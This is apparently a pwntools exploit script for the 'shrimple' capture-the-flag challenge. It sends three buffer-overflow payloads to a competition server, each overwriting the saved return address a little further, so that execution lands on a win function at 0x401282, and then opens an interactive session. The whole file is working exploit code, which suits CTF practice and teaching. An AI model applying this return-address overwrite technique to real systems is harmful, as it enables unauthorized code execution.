from pwn import*

#a very shrimple challenge where we peel back the return address

e = ELF("shrimple")

io = remote("chal.competitivecyber.club", 8884)

#original return address 0xf7xxxxxxxxxx
#we want the return address to be 0x401282
#if we doing it at once we end up with 0xf7xx401282
#which does not take us back to shrimple so we must slowy but surely overwrite the upper bytes with zero

#peel back the original address to be shrimp + 5

#return address 0xf7xxxxxxxxxx
io.sendlineafter(b"shrimple", b'1'* (0x28 ) + b"\x82\x12\x40" + b"\x00")
#current return address 0x004012822882
io.sendlineafter(b"shrimple",b'1' * (0x27) +  b"\x82\x12\x40" + b"\x00")
##current return address 0x000040128282
io.sendlineafter(b"shrimple",b'1' * (0x26) +  b"\x82\x12\x40" + b"\x00")
##return address 0x401282 and win 

io.interactive()
